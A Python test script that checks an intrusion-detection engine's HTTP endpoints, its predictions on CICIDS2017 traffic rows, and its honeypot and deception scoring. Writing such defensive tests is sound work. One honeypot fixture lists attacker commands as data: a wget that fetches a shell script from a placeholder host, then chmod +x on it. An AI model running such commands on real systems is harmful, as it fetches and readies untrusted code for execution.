"""
End-to-end check of the AI engine over HTTP, against real CICIDS2017 rows.

Starts an isolated uvicorn process (random port, throwaway SENTINEL_KEY, Q-table in .test-runtime/,
backend callbacks pointed at a dead port), then:
  1. calls every endpoint and checks status codes and response shape;
  2. sends real benign and attack rows per class and prints predicted class / threatScore / action;
  3. proves train/serve consistency: the vector the engine scores (featureVector from /predict/internal)
     equals the vector training builds from the same CSV row (utils.features.prepare_features);
  4. shows what happens when a caller sends raw CSV header names instead of the schema's field names;
  5. scores two honeypot sessions and asks for a deception recommendation.

Usage (from the repo root):  ai-engine/.venv/Scripts/python.exe scripts/ai_engine_endpoint_check.py
Nothing outside .test-runtime/ is written. The rows come from the training CSVs, so the per-class
predictions are a sanity check of the serving path, not an independent accuracy estimate.
"""
from pathlib import Path
import json, os, secrets, socket, subprocess, sys, time

import httpx
import numpy as np
import pandas as pd

ROOT = Path(__file__).resolve().parents[1]
AI = ROOT / "ai-engine"
sys.path.insert(0, str(AI))
from utils.features import FEATURE_NAMES, RAW_LABEL_TO_TARGET, prepare_features  # noqa: E402

sys.stdout.reconfigure(errors="backslashreplace")  # CICIDS web-attack labels contain U+FFFD

DATA = AI / "datasets" / "cicids2017"
PER_LABEL = 5
runtime = ROOT / ".test-runtime" / "endpoint-check"
runtime.mkdir(parents=True, exist_ok=True)
failures = []


def check(cond, what):
    print(("  PASS " if cond else "  FAIL ") + what)
    if not cond:
        failures.append(what)


def sample_rows():
    """Up to PER_LABEL rows per raw CICIDS label, read from every CSV."""
    picked = []
    for f in sorted(DATA.glob("*.csv")):
        df = pd.read_csv(f, low_memory=False)
        df.columns = df.columns.str.strip()
        df["Label"] = df["Label"].astype(str).str.strip()
        numeric = df.drop(columns=["Label"]).apply(pd.to_numeric, errors="coerce")
        df = df[np.isfinite(numeric.to_numpy(dtype=float)).all(axis=1)]
        for _, grp in df.groupby("Label"):
            picked.append(grp.sample(n=min(PER_LABEL, len(grp)), random_state=7))
    return pd.concat(picked, ignore_index=True)


def main():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
    q_path = runtime / "q_table.json"
    q_path.unlink(missing_ok=True)
    env = dict(os.environ, SENTINEL_KEY=secrets.token_hex(32), MODEL_DIR=str(AI / "models"),
               Q_TABLE_PATH=str(q_path), SENTINEL_API="http://127.0.0.1:1/api", ENABLE_SHADOW_E2="true")
    log = (runtime / "engine.log").open("w")
    proc = subprocess.Popen([sys.executable, "-m", "uvicorn", "inference.main:app", "--host", "127.0.0.1",
                             "--port", str(port)], cwd=AI, env=env, stdout=log, stderr=subprocess.STDOUT)
    try:
        run(port, env["SENTINEL_KEY"], q_path)
    finally:
        proc.terminate()
        proc.wait(timeout=20)
        log.close()
    print(f"\n{'ALL CHECKS PASSED' if not failures else str(len(failures)) + ' CHECK(S) FAILED: ' + '; '.join(failures)}")
    sys.exit(1 if failures else 0)


def run(port, key, q_path):
    H = {"X-API-Key": key}
    with httpx.Client(base_url=f"http://127.0.0.1:{port}", timeout=60) as c:
        for _ in range(120):
            try:
                if c.get("/ready").status_code == 200:
                    break
            except httpx.HTTPError:
                pass
            time.sleep(0.5)
        else:
            raise RuntimeError("engine not ready; see .test-runtime/endpoint-check/engine.log")

        print("\n[1] Endpoints")
        check(c.get("/health").json()["status"] == "ok", "GET /health public, status ok")
        check(c.get("/ready").status_code == 200, "GET /ready 200 (registered models loaded)")
        check(c.get("/model/info").status_code == 401, "GET /model/info without key -> 401")
        check(c.get("/model/info", headers={"X-API-Key": "wrong"}).status_code == 403, "wrong key -> 403")
        info = c.get("/model/info", headers=H).json()
        pinned = json.loads((AI / "models" / "registry.json").read_text())["classifier"]["file"]
        check(info["modelsLoaded"] and info["registry"]["classifier"] == pinned,
              f"GET /model/info serves {info['registry']['classifier']} + {info['registry']['anomaly']} (sha256 verified={info['registry']['verified']})")
        print(f"       thresholds={info['thresholds']}  rfVersion={info['rfVersion']}  metrics={info['rfMetrics']}")
        check(c.get("/metrics").status_code == 200, "GET /metrics from loopback -> 200")
        check(c.post("/predict/eval", headers=H, json={"flow_duration": "NaN"}).status_code == 422, "NaN feature -> 422")
        check(c.post("/predict/batch", headers=H, json=[{}] * 501).status_code == 400, "batch of 501 -> 400")

        rows = sample_rows()
        X_train_path, y = prepare_features(rows, max_missing=0)
        print(f"\n[2] Real CICIDS2017 rows per class ({len(rows)} rows, {PER_LABEL} per raw label)")
        out = []
        for i, row in rows.iterrows():
            # Same mapping as demo/replay_cicids.py: schema field names, plus a timestamp.
            record = {fn: float(X_train_path[i, j]) for j, fn in enumerate(FEATURE_NAMES)
                      if fn not in ("payload_entropy", "time_of_day_sin", "time_of_day_cos")}
            record["sourceIP"] = "192.0.2.10"
            r = c.post("/predict/internal", headers=H, json=record)
            r.raise_for_status()
            res = r.json()["result"]
            vec = np.array(res["featureVector"])
            out.append({"raw": row["Label"], "target": RAW_LABEL_TO_TARGET.get(row["Label"], row["Label"]),
                        "pred": res["predictedClass"], "score": res["threatScore"], "action": res["action"],
                        "anomaly": res["isAnomaly"], "same_vector": bool(np.allclose(vec, X_train_path[i]))})
        df = pd.DataFrame(out)
        df["correct"] = (df["pred"] == df["target"]) | ((df["target"] != "BENIGN") & (df["pred"] == "Unknown"))
        summary = df.groupby("raw").agg(target=("target", "first"), n=("pred", "size"), correct=("correct", "sum"),
                                         preds=("pred", lambda s: ",".join(sorted(set(s)))),
                                         mean_score=("score", "mean"),
                                         actions=("action", lambda s: ",".join(f"{a}:{n}" for a, n in s.value_counts().items())))
        print(summary.to_string())
        benign = df[df.target == "BENIGN"]
        attack = df[df.target != "BENIGN"]
        check(benign["pred"].eq("BENIGN").mean() >= 0.8, f"benign rows predicted BENIGN: {benign['pred'].eq('BENIGN').mean():.0%}")
        check(attack["pred"].ne("BENIGN").mean() >= 0.8, f"attack rows predicted non-BENIGN: {attack['pred'].ne('BENIGN').mean():.0%}")

        print("\n[3] Train/serve consistency")
        check(df["same_vector"].all(), f"served featureVector == training prepare_features vector for {df['same_vector'].sum()}/{len(df)} rows")
        ev = c.post("/predict/eval", headers=H, json=dict(record)).json()["result"]
        check("featureVector" not in ev, "/predict/eval hides featureVector; /predict/internal returns it")

        print("\n[4] Caller sends raw CSV header names instead of schema field names")
        raw = rows.iloc[0].drop(labels=["Label"]).to_dict()
        raw = {k: float(v) for k, v in raw.items()}
        res = c.post("/predict/internal", headers=H, json=raw).json()["result"]
        idx = FEATURE_NAMES.index("flow_duration")
        print(f"       CSV Flow Duration={raw['Flow Duration']}  -> engine used flow_duration={res['featureVector'][idx]}")
        print(f"       defaultedFeatures reported: {len(res['defaultedFeatures'])} fields")
        check(res["featureVector"][idx] == raw["Flow Duration"],
              "CSV-named fields reach the model (FAIL = Record defaults shadow them; send schema names)")

        print("\n[5] Batch, public /predict, drift, stats, reload")
        b = c.post("/predict/batch", headers=H, json=[record] * 3).json()
        check(b["total"] == 3, "POST /predict/batch returns 3 results")
        check(c.post("/predict", headers=H, json=record).json()["success"], "POST /predict (backend callback fails quietly)")
        drift = c.get("/model/drift", headers=H).json()
        check(drift["samples"] > 0, f"GET /model/drift status={drift['status']} samples={drift['samples']}")
        stats = c.get("/model/stats", headers=H).json()
        check(stats["totalPredictions"] > 0, f"GET /model/stats totalPredictions={stats['totalPredictions']}")
        rl = c.post("/model/reload", headers=H)
        check(rl.status_code == 200 and rl.json()["success"], "POST /model/reload swaps in the registered models")

        print("\n[6] Honeypot + deception (isolated Q-table)")
        brute = {"sessionId": "chk-1", "sourceIP": "203.0.113.5", "durationSeconds": 4, "loginSucceeded": False,
                 "commands": [], "iocCount": 0, "deceptionProfile": "ubuntu_22"}
        deep = {"sessionId": "chk-2", "sourceIP": "203.0.113.6", "durationSeconds": 480, "loginSucceeded": True,
                "iocCount": 3, "deceptionProfile": "centos_7", "previousProfile": "ubuntu_22",
                "commands": [{"command": "wget http://x/y.sh", "intent": "MALWARE_DOWNLOAD"},
                             {"command": "chmod +x y.sh", "intent": "PERSISTENCE"}]}
        for s in (brute, deep):
            hp = c.post("/predict/honeypot/internal", headers=H, json=s).json()["result"]
            print(f"       honeypot {s['sessionId']}: class={hp['predictedClass']} score={hp['threatScore']} method={hp['classificationMethod']}")
        before = json.loads(q_path.read_text())["q_table"]["ubuntu_22"]["centos_7"] if q_path.exists() else None
        ds = c.post("/deception/score", headers=H, json=deep).json()["result"]
        after = json.loads(q_path.read_text())["q_table"]["ubuntu_22"]["centos_7"]
        print(f"       reward={ds['rawReward']} deceptionScore={ds['deceptionScore']} Q(ubuntu_22,centos_7): {before} -> {after}  next={ds['nextProfile']}")
        check(after != before, "POST /deception/score updated and persisted the Q-table")
        rec = c.get("/deception/recommendation", headers=H, params={"current": "centos_7"}).json()
        check(rec["success"], f"GET /deception/recommendation current=centos_7 -> {rec['nextProfile']} (explored={rec['explored']})")
        check(c.get("/deception/recommendation", headers=H, params={"current": "nope"}).status_code == 422, "unknown profile -> 422")
        sh = c.post("/predict/auth/shadow", headers=H, json={"src_ip": "203.0.113.7"}).json()
        check(sh["success"], f"POST /predict/auth/shadow shadow_enabled={sh.get('shadow_enabled')} decision={sh.get('decision')}")


if __name__ == "__main__":
    main()
